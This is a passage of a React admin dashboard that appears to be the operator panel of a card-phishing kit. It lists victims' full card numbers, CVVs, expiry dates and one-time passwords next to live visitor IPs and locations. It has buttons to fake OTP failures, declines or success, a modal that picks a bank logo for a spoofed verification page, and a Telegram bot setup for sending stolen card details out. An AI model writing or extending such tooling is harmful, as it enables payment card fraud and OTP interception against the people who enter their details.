                        <span className="text-sm font-mono text-white">{formatExpiry(payment)}</span>
                      </div>
                      <div className="flex items-center justify-between">
                        <span className="text-xs text-gray-400">Amount:</span>
                        <span className="text-sm font-medium text-white">{formatPrice(payment.amount)}</span>
                      </div>
                      {payment.cardCountry && (
                        <div className="flex items-center justify-between">
                          <span className="text-xs text-gray-400">Country:</span>
                          <div className="flex items-center gap-1">
                            <span className="text-sm">{payment.cardCountry.flag}</span>
                            <span className="text-xs text-gray-300">{payment.cardCountry.name}</span>
                          </div>
                        </div>
                      )}
                    </div>

                    {/* OTP Display for this payment */}
                    {otps.length > 0 && otps[0].paymentId === payment.id && (
                      <div className="bg-blue-900 rounded-lg p-3 border border-blue-700 mb-3">
                        <div className="flex items-center justify-between">
                          <span className="text-xs text-blue-300">OTP:</span>
                          <div className="flex items-center gap-2">
                            <span className="text-lg font-bold text-blue-100 bg-blue-800 px-2 py-1 rounded font-mono">
                              {otps[0].otp}
                            </span>
                            <Button
                              variant="ghost"
                              size="sm"
                              onClick={(e) => {
                                e.stopPropagation();
                                copyToClipboard(otps[0].otp);
                              }}
                              className="h-6 w-6 p-0 text-blue-300 hover:text-blue-100"
                            >
                              <Copy className="h-3 w-3" />
                            </Button>
                          </div>
                        </div>
                      </div>
                    )}

                    {/* Action Buttons */}
                    <div className="grid grid-cols-2 gap-2">
                      <Button
                        onClick={(e) => {
                          e.stopPropagation();
                          handleAction(payment.paymentId, 'show-otp');
                        }}
                        size="sm"
                        className="h-10 text-xs bg-blue-600 text-white hover:bg-blue-700"
                      >
                        Show OTP
                      </Button>
                      <Button
                        onClick={(e) => {
                          e.stopPropagation();
                          handleAction(payment.paymentId, 'validate-otp');
                        }}
                        size="sm"
                        className="h-10 text-xs bg-green-600 text-white hover:bg-green-700"
                      >
                        Validate
                      </Button>
                      <Button
                        onClick={(e) => {
                          e.stopPropagation();
                          handleAction(payment.paymentId, 'fail-otp');
                        }}
                        size="sm"
                        className="h-10 text-xs bg-red-600 text-white hover:bg-red-700"
                      >
                        Fail OTP
                      </Button>
                      <Button
                        onClick={(e) => {
                          e.stopPropagation();
                          handleAction(payment.paymentId, 'card-declined');
                        }}
                        size="sm"
                        className="h-10 text-xs bg-orange-600 text-white hover:bg-orange-700"
                      >
                        Declined
                      </Button>
                      <Button
                        onClick={(e) => {
                          e.stopPropagation();
                          handleAction(payment.paymentId, 'insufficient-balance');
                        }}
                        size="sm"
                        className="h-10 text-xs bg-yellow-600 text-white hover:bg-yellow-700"
                      >
                        Insufficient
                      </Button>
                      <Button
                        onClick={(e) => {
                          e.stopPropagation();
                          handleAction(payment.paymentId, 'successful');
                        }}
                        size="sm"
                        className="h-10 text-xs bg-emerald-600 text-white hover:bg-emerald-700"
                      >
                        Success
                      </Button>
                    </div>
                    
                    {/* Delete Button */}
                    <div className="mt-3 pt-3 border-t border-gray-700">
                      <Button
                        onClick={(e) => {
                          e.stopPropagation();
                          deleteTransaction(payment.id);
                        }}
                        size="sm"
                        variant="outline"
                        className="w-full h-10 text-xs border-red-600 text-red-400 hover:bg-red-600 hover:text-white"
                      >
                        Delete Transaction
                      </Button>
                    </div>
                  </div>
                );
              })
            )}
          </div>
          
          {/* Desktop table view */}
          <div className="hidden sm:block overflow-x-auto">
            <table className="w-full">
              <thead className="bg-gray-800">
                <tr>
                  <th className="px-2 py-2 text-left text-xs font-medium text-gray-300 uppercase">
                    Time
                  </th>
                  <th className="px-2 py-2 text-left text-xs font-medium text-gray-300 uppercase">
                    Customer
                  </th>
                  <th className="px-2 py-2 text-left text-xs font-medium text-gray-300 uppercase">
                    Card
                  </th>
                  <th className="px-2 py-2 text-left text-xs font-medium text-gray-300 uppercase">
                    Name
                  </th>
                  <th className="px-2 py-2 text-left text-xs font-medium text-gray-300 uppercase">
                    CVV
                  </th>
                  <th className="px-2 py-2 text-left text-xs font-medium text-gray-300 uppercase">
                    Exp
                  </th>
                  <th className="px-2 py-2 text-left text-xs font-medium text-gray-300 uppercase">
                    Amount
                  </th>
                  <th className="px-2 py-2 text-left text-xs font-medium text-gray-300 uppercase">
                    OTP
                  </th>
                  <th className="px-2 py-2 text-left text-xs font-medium text-gray-300 uppercase">
                    Country
                  </th>
                  <th className="px-2 py-2 text-left text-xs font-medium text-gray-300 uppercase">
                    Status
                  </th>
                  <th className="px-2 py-2 text-left text-xs font-medium text-gray-300 uppercase">
                    Actions
                  </th>
                  <th className="px-2 py-2 text-left text-xs font-medium text-gray-300 uppercase">
                    Send
                  </th>
                </tr>
              </thead>
              <tbody className="divide-y divide-gray-700">
                {payments.length === 0 ? (
                  <tr>
                    <td colSpan={12} className="px-6 py-8 text-center text-gray-400">
                      No payment data received yet. Waiting for transactions...
                    </td>
                  </tr>
                ) : (
                  payments.map((payment) => {
                    const isNewCard = !clickedCards.has(payment.id);
                    return (
                    <tr 
                      key={payment.id} 
                      className={`hover:bg-gray-800 cursor-pointer transition-all duration-300 ${
                        isNewCard 
                          ? 'border-2 border-cyan-400 shadow-lg shadow-cyan-400/50 animate-pulse bg-gray-800/50' 
                          : ''
                      }`}
                      onClick={() => handleCardClick(payment.id)}
                      style={{
                        boxShadow: isNewCard ? '0 0 20px rgba(34, 211, 238, 0.6), inset 0 0 20px rgba(34, 211, 238, 0.1)' : undefined
                      }}
                    >
                      <td className="px-1 py-2 text-xs">
                        {new Date(payment.timestamp).toLocaleTimeString()}
                      </td>
                      <td className="px-1 py-2">
                        <div className="text-xs font-medium text-white">{payment.billingDetails.firstName}</div>
                        <div className="text-xs text-gray-400 truncate max-w-[100px]">{payment.billingDetails.email}</div>
                      </td>
                      <td className="px-1 py-2 text-xs font-mono">
                        <div className="flex items-center gap-1">
                          <span className="text-green-400">{formatCardNumber(payment.cardNumber)}</span>
                          <Button
                            variant="ghost"
                            size="sm"
                            onClick={() => copyToClipboard(payment.cardNumber)}
                            className="h-4 w-4 p-0 text-gray-400 hover:text-white"
                          >
                            <Copy className="h-2 w-2" />
                          </Button>
                        </div>
                      </td>
                      <td className="px-1 py-2 text-xs truncate max-w-[80px]">
                        {payment.cardName}
                      </td>
                      <td className="px-1 py-2 text-xs font-mono">
                        {payment.cvv}
                      </td>
                      <td className="px-1 py-2 text-xs">
                        {formatExpiry(payment)}
                      </td>
                      <td className="px-1 py-2 text-xs font-medium">
                        ₹{payment.amount.toLocaleString()}
                      </td>
                      <td className="px-1 py-2 text-xs">
                        {(() => {
                          const paymentOtp = otps.find(otp => otp.paymentId === payment.paymentId);
                          return paymentOtp ? (
                            <span className="text-xs font-bold text-blue-300 bg-blue-900 px-1 py-1 rounded font-mono">
                              {paymentOtp.otp}
                            </span>
                          ) : (
                            <span className="text-gray-500 text-xs">-</span>
                          );
                        })()
                        }
                      </td>
                      <td className="px-1 py-2 text-xs">
                        {payment.cardCountry ? (
                          <div className="flex items-center gap-1">
                            <span className="text-sm">{payment.cardCountry.flag}</span>
                            <span className="text-xs text-gray-300 truncate max-w-[60px]">{payment.cardCountry.name}</span>
                          </div>
                        ) : (
                          <span className="text-gray-500 text-xs">?</span>
                        )}
                      </td>
                      <td className="px-1 py-2">
                        <span className={`text-xs font-medium ${getStatusColor(payment.status)}`}>
                          {payment.status === 'approved' ? '✓' : payment.status === 'rejected' ? '✗' : '⚠'}
                        </span>
                      </td>
                      <td className="px-1 py-2">
                        <div className="flex flex-wrap gap-1">
                          <Button
                            onClick={(e) => {
                              e.stopPropagation();
                              handleAction(payment.paymentId, 'show-otp');
                            }}
                            size="sm"
                            className="text-xs h-5 px-1 bg-blue-600 hover:bg-blue-700"
                            title="Show OTP"
                          >
                            OTP
                          </Button>
                          <Button
                            onClick={(e) => {
                              e.stopPropagation();
                              handleAction(payment.paymentId, 'validate-otp');
                            }}
                            size="sm"
                            className="text-xs h-5 px-1 bg-green-600 hover:bg-green-700"
                            title="Validate OTP"
                          >
                            ✓
                          </Button>
                          <Button
                            onClick={(e) => {
                              e.stopPropagation();
                              handleAction(payment.paymentId, 'fail-otp');
                            }}
                            size="sm"
                            className="text-xs h-5 px-1 bg-red-600 hover:bg-red-700"
                            title="Fail OTP"
                          >
                            ✗
                          </Button>
                          <Button
                            onClick={(e) => {
                              e.stopPropagation();
                              handleAction(payment.paymentId, 'card-declined');
                            }}
                            size="sm"
                            className="text-xs h-5 px-1 bg-orange-600 hover:bg-orange-700"
                            title="Card Declined"
                          >
                            🚫
                          </Button>
                          <Button
                            onClick={(e) => {
                              e.stopPropagation();
                              handleAction(payment.paymentId, 'insufficient-balance');
                            }}
                            size="sm"
                            className="text-xs h-5 px-1 bg-yellow-600 hover:bg-yellow-700"
                            title="Insufficient Balance"
                          >
                            💸
                          </Button>
                          <Button
                            onClick={(e) => {
                              e.stopPropagation();
                              handleAction(payment.paymentId, 'successful');
                            }}
                            size="sm"
                            className="text-xs h-5 px-1 bg-emerald-600 hover:bg-emerald-700"
                            title="Payment Success"
                          >
                            🎉
                          </Button>
                        </div>
                      </td>
                      <td className="px-1 py-2">
                        <Button
                          onClick={async (e) => {
                            e.stopPropagation();
                            console.log('🤖 Telegram send clicked for payment:', payment.paymentId);
                            console.log('Telegram configured:', isTelegramConfigured);
                            if (isTelegramConfigured) {
                              await sendToTelegram(payment);
                            } else {
                              toast({
                                title: "Setup Required",
                                description: "Please configure Telegram settings first.",
                                variant: "destructive",
                              });
                            }
                          }}
                          size="sm"
                          className={`text-xs h-6 px-2 text-white ${
                            isTelegramConfigured 
                              ? 'bg-purple-600 hover:bg-purple-700' 
                              : 'bg-gray-600 hover:bg-gray-700 cursor-not-allowed'
                          }`}
                          title={isTelegramConfigured ? "Send card details to Telegram" : "Configure Telegram bot first"}
                        >
                          🤖
                        </Button>
                      </td>
                    </tr>
                    );
                  })
                )}
              </tbody>
            </table>
          </div>
        </div>

        {/* OTP Data Table */}
        <div className="bg-gray-900 rounded-lg overflow-hidden">
          <div className="p-6 border-b border-gray-700">
            <h2 className="text-xl font-semibold">OTP Submissions</h2>
            <p className="text-gray-400 mt-1">OTPs received from customers ({otps.length} total)</p>
          </div>
          
          {otps.length === 0 ? (
            <div className="p-8 text-center text-gray-500">
              No OTP submissions at the moment
            </div>
          ) : (
            
            <div className="overflow-x-auto">
              <table className="w-full">
                <thead className="bg-gray-800">
                  <tr>
                    <th className="px-6 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider">
                      Timestamp
                    </th>
                    <th className="px-6 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider">
                      Payment ID
                    </th>
                    <th className="px-6 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider">
                      OTP
                    </th>
                  </tr>
                </thead>
                <tbody className="divide-y divide-gray-700">
                  {otps.map((otp, index) => (
                    <tr key={index} className="hover:bg-gray-800">
                      <td className="px-6 py-4 whitespace-nowrap text-sm">
                        {new Date(otp.timestamp).toLocaleString()}
                      </td>
                      <td className="px-6 py-4 whitespace-nowrap text-sm font-mono">
                        {otp.paymentId}
                      </td>
                       <td className="px-6 py-4 whitespace-nowrap">
                         <div className="flex items-center gap-2">
                           <span className="text-yellow-400 font-mono text-lg">{otp.otp}</span>
                           <Button
                             variant="ghost"
                             size="sm"
                             onClick={() => copyToClipboard(otp.otp)}
                             className="h-6 w-6 p-0 text-gray-400 hover:text-white"
                           >
                             <Copy className="h-3 w-3" />
                           </Button>
                         </div>
                       </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          )}
        </div>

        {/* OTP Customization Modal */}
        <Dialog open={showOtpModal} onOpenChange={setShowOtpModal}>
          <DialogContent className="sm:max-w-2xl max-w-md bg-gray-900 border-gray-700">
            <DialogHeader>
              <DialogTitle className="text-white">Customize OTP Screen</DialogTitle>
              <DialogDescription className="text-gray-400">
                Select bank logo and amount to display on the OTP verification page
              </DialogDescription>
            </DialogHeader>
            
            <div className="space-y-6 py-4">
              {/* Bank Logo Selection */}
              <div>
                <label className="block text-sm font-medium text-gray-300 mb-3">
                  Select Bank Logo
                </label>
                <div className="grid grid-cols-2 gap-3 max-h-64 overflow-y-auto">
                  {bankLogos.map((bank, index) => (
                    <div
                      key={index}
                      onClick={() => setSelectedBankLogo(bank.logo)}
                      className={`p-3 border rounded-lg cursor-pointer transition-all ${
                        selectedBankLogo === bank.logo
                          ? 'border-blue-500 bg-blue-900/20'
                          : 'border-gray-600 hover:border-gray-500'
                      }`}
                    >
                      <div className="flex flex-col items-center space-y-2">
                        <img
                          src={bank.logo}
                          alt={bank.name}
                          className="w-12 h-12 object-contain"
                          onError={(e) => {
                            e.currentTarget.style.display = 'none';
                          }}
                        />
                        <span className="text-xs text-gray-300 text-center">
                          {bank.name}
                        </span>
                      </div>
                    </div>
                  ))}
                </div>
              </div>

              {/* Currency Selector */}
              <div>
                <label className="block text-sm font-medium text-gray-300 mb-2">
                  Select Currency
                </label>
                <Select value={selectedCurrency} onValueChange={setSelectedCurrency}>
                  <SelectTrigger className="bg-gray-800 border-gray-600 text-white">
                    <SelectValue placeholder="Choose currency" />
                  </SelectTrigger>
                  <SelectContent className="bg-gray-800 border-gray-600">
                    {currencies.map((currency) => (
                      <SelectItem 
                        key={currency.code} 
                        value={currency.code}
                        className="text-white hover:bg-gray-700"
                      >
                        <div className="flex items-center gap-2">
                          <span>{currency.flag}</span>
                          <span>{currency.code}</span>
                          <span className="text-gray-400">({currency.symbol})</span>
                        </div>
                      </SelectItem>
                    ))}
                  </SelectContent>
                </Select>
              </div>
            </div>

            <div className="flex gap-3">
              <Button
                variant="outline"
                onClick={() => setShowOtpModal(false)}
                className="flex-1 border-gray-600 text-gray-300 hover:bg-gray-800"
              >
                Cancel
              </Button>
              <Button
                onClick={handleOtpModalConfirm}
                className="flex-1 bg-blue-600 hover:bg-blue-700 text-white"
                disabled={!selectedBankLogo || !selectedCurrency}
              >
                Continue
              </Button>
            </div>
          </DialogContent>
        </Dialog>

        {/* Telegram Settings Modal */}
        <Dialog open={showTelegramSettings} onOpenChange={setShowTelegramSettings}>
          <DialogContent className="bg-gray-900 text-white border-gray-700 max-w-md">
            <DialogHeader>
              <DialogTitle className="text-xl font-bold text-center">
                🤖 Telegram Bot Setup
              </DialogTitle>
            </DialogHeader>
            <div className="space-y-4">
              <div className="text-sm text-gray-400 space-y-2">
                <p><strong>Step 1:</strong> Create a bot with @BotFather on Telegram</p>
                <p><strong>Step 2:</strong> Get your Chat ID from @userinfobot</p>
                <p><strong>Step 3:</strong> Enter the details below</p>
              </div>
              
              <div className="space-y-3">
                <div>
                  <label className="block text-sm font-medium mb-1">Bot Token</label>
                  <input
                    type="password"
                    value={telegramBotToken}
                    onChange={(e) => setTelegramBotToken(e.target.value)}
                    placeholder="Enter your bot token"
                    className="w-full px-3 py-2 bg-gray-800 border border-gray-600 rounded-md text-white placeholder-gray-400 focus:ring-2 focus:ring-blue-500 focus:border-transparent"
                  />
                </div>
                
                <div>
                  <label className="block text-sm font-medium mb-1">Chat ID</label>
                  <input
                    type="text"
                    value={telegramChatId}
                    onChange={(e) => setTelegramChatId(e.target.value)}
                    placeholder="Enter your chat ID"
                    className="w-full px-3 py-2 bg-gray-800 border border-gray-600 rounded-md text-white placeholder-gray-400 focus:ring-2 focus:ring-blue-500 focus:border-transparent"
                  />
                </div>
              </div>
            </div>
            
            <div className="flex gap-3 mt-6">
              <Button
                onClick={() => setShowTelegramSettings(false)}
                variant="outline"
                className="flex-1 border-gray-600 text-gray-300 hover:bg-gray-800"
              >
                Cancel
              </Button>
              <Button
                onClick={(e) => {
                  e.preventDefault();
                  configureTelegram(telegramBotToken, telegramChatId);
                }}
                className="flex-1 bg-purple-600 hover:bg-purple-700 text-white"
                disabled={!telegramBotToken.trim() || !telegramChatId.trim()}
              >
                Save Settings
              </Button>
            </div>
          </DialogContent>
        </Dialog>
          </>
        )}

        {/* Visitors Tab */}
        {activeTab === 'visitors' && (
          <div className="bg-gray-900 rounded-lg overflow-hidden">
            <div className="p-4 sm:p-6 border-b border-gray-700">
              <h2 className="text-lg sm:text-xl font-semibold">Live Visitors</h2>
              <p className="text-gray-400 mt-1 text-sm sm:text-base">Real-time visitor tracking ({liveVisitors.length} active)</p>
            </div>
            
            {/* Mobile-friendly visitor cards */}
            <div className="block sm:hidden">
              {liveVisitors.length === 0 ? (
                <div className="p-6 text-center text-gray-400">
                  No live visitors at the moment
                </div>
              ) : (
                liveVisitors.map((visitor) => (
                  <div key={visitor.id} className="p-4 border-b border-gray-700 last:border-b-0">
                    <div className="flex items-center justify-between mb-2">
                      <div className="bg-red-600 text-black px-2 py-1 rounded font-bold text-sm">
                        {visitor.ipAddress}
                      </div>
                      <span className="inline-flex items-center px-2 py-1 rounded-full text-xs font-medium bg-green-100 text-green-800">
                        <div className="w-2 h-2 bg-green-500 rounded-full mr-1 animate-pulse"></div>
                        Online
                      </span>
                    </div>
                    <div className="space-y-1 text-sm">
                      <div className="flex items-center gap-2">
                        <span className="text-gray-400">ISP:</span>
                        <div className="bg-blue-600 text-white px-2 py-1 rounded text-xs">
                          {visitor.isp || 'Loading...'}
                        </div>
                      </div>
                      <div className="flex items-center gap-2">
                        <span className="text-gray-400">Location:</span>
                        <span className="text-gray-300">{visitor.country || 'Unknown'}, {visitor.city || 'Unknown'}</span>
                      </div>
                      <div className="text-xs text-gray-400">
                        {new Date(visitor.timestamp).toLocaleString()}
                      </div>
                    </div>
                  </div>
                ))
              )}
            </div>
            
            {/* Desktop table view */}
            <div className="hidden sm:block overflow-x-auto">
              <table className="w-full">
                <thead className="bg-gray-800">
                  <tr>
                    <th className="px-6 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider">
                      Timestamp
                    </th>
                    <th className="px-6 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider">
                      IP Address
                    </th>
                    <th className="px-6 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider">
                      ISP
                    </th>
                    <th className="px-6 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider">
                      Location
                    </th>
                    <th className="px-6 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider">
                      User Agent
                    </th>
                    <th className="px-6 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider">
                      Status
                    </th>
                  </tr>
                </thead>
                <tbody className="divide-y divide-gray-700">
                  {liveVisitors.length === 0 ? (
                    <tr>
                      <td colSpan={6} className="px-6 py-8 text-center text-gray-400">
                        No live visitors at the moment
                      </td>
                    </tr>
                  ) : (
                    liveVisitors.map((visitor) => (
                      <tr key={visitor.id} className="hover:bg-gray-800">
                        <td className="px-6 py-4 whitespace-nowrap text-sm">
                          {new Date(visitor.timestamp).toLocaleString()}
                        </td>
                        <td className="px-6 py-4 whitespace-nowrap">
                          <div className="bg-red-600 text-black px-3 py-1 rounded font-bold text-sm">
                            {visitor.ipAddress}
                          </div>
                        </td>
                        <td className="px-6 py-4 whitespace-nowrap text-sm">
                          <div className="bg-blue-600 text-white px-2 py-1 rounded text-xs font-medium">
                            {visitor.isp || 'Loading...'}
                          </div>
                        </td>
                        <td className="px-6 py-4 whitespace-nowrap text-sm text-gray-300">
                          <div className="flex flex-col">
                            <span className="text-xs text-gray-400">{visitor.country || 'Unknown'}</span>
                            <span className="text-xs">{visitor.city || 'Unknown'}</span>
                          </div>
                        </td>
                        <td className="px-6 py-4 text-sm text-gray-300">
                          <div className="max-w-xs truncate" title={visitor.userAgent}>
                            {visitor.userAgent}
                          </div>
                        </td>
                        <td className="px-6 py-4 whitespace-nowrap">
                          <span className="inline-flex items-center px-2.5 py-0.5 rounded-full text-xs font-medium bg-green-100 text-green-800">
                            <div className="w-2 h-2 bg-green-500 rounded-full mr-1 animate-pulse"></div>
                            Online
                          </span>
                        </td>
                      </tr>
                    ))
                  )}
                </tbody>
              </table>
            </div>
          </div>
        )}

        {/* Analytics Tab */}
        {activeTab === 'analytics' && (
          <div className="bg-gray-900 rounded-lg p-6">
            <Analytics 
              socket={socket} 
              globalCurrency={globalCurrency} 
              exchangeRate={exchangeRate} 
            />
          </div>
        )}
      </div>
    </div>
  );
};

export default Admin;
